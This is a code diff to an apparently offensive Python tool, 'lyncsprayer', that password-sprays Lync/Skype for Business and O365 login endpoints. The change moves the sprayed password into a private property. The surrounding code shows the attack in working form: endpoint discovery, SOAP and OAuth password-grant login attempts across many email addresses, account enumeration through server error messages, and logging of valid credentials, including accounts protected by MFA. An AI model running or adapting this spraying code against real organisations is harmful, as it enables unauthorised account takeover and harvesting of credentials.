@@ -9,15 +9,22 @@ from datetime import datetime
 
 
 class Lync:
-    def __init__(self, domain, password):
+    def __init__(self, domain):
         self.domain = domain
-        self.password = password
         self.log = logging.getLogger('lyncsprayer')
         self.valid_accounts = set()
         self.lync_base_url = None
         self.O365 = False
 
         self.recon()
+
+    @property
+    def password(self):
+        return self.__password
+
+    @password.setter
+    def password(self, password):
+        self.__password = password
 
     def recon(self):
         lync_url = f"https://lyncdiscover.{self.domain}"
@@ -70,7 +77,7 @@ class Lync:
     <wsse:Security>
     <wsse:UsernameToken wsu:Id="user">
         <wsse:Username>{email}</wsse:Username>
-        <wsse:Password>{self.password}</wsse:Password>
+        <wsse:Password>{self.__password}</wsse:Password>
     </wsse:UsernameToken>
     <wsu:Timestamp Id="Timestamp">
         <wsu:Created>{utc_time.replace('+00:00', '1Z')}</wsu:Created>
@@ -100,15 +107,15 @@ class Lync:
             log.error(print_bad('Invalid request was received by server, dumping request & response XML'))
             log.error(soap + '\n' + r.text)
         elif 'To sign into this application the account must be added' in msg:
-            log.info(print_bad(f"Authentication failed: {email}:{self.password} (Username does not exist)"))
+            log.info(print_bad(f"Authentication failed: {email}:{self.__password} (Username does not exist)"))
         elif 'Error validating credentials' in msg:
-            log.info(print_bad(f"Authentication failed: {email}:{self.password} (Invalid credentials)"))
+            log.info(print_bad(f"Authentication failed: {email}:{self.__password} (Invalid credentials)"))
             self.valid_accounts.add(email)
         elif 'you must use multi-factor' in msg.lower():
-            log.info(print_good(f"Found Credentials: {email}:{self.password} (However, MFA is required)"))
+            log.info(print_good(f"Found Credentials: {email}:{self.__password} (However, MFA is required)"))
             self.valid_accounts.add(email)
         else:
-            log.info(print_good(f"Found credentials: {email}:{self.password}"))
+            log.info(print_good(f"Found credentials: {email}:{self.__password}"))
             self.valid_accounts.add(email)
 
     # https://github.com/mdsecresearch/LyncSniper/blob/master/LyncSniper.ps1#L397-L406
@@ -117,12 +124,12 @@ class Lync:
         payload = {
             "grant_type": "password",
             "username": email,
-            "password": self.password
+            "password": self.__password
         }
 
         r = requests.post(self.lync_base_url, data=payload)
         try:
             r.json()['access_token']
-            log.info(print_good(f"Found credentials: {email}:{self.password}"))
+            log.info(print_good(f"Found credentials: {email}:{self.__password}"))
         except Exception as e:
-            log.info(print_bad(f"Invalid credentials: {email}:{self.password} ({e})"))
+            log.info(print_bad(f"Invalid credentials: {email}:{self.__password} ({e})"))
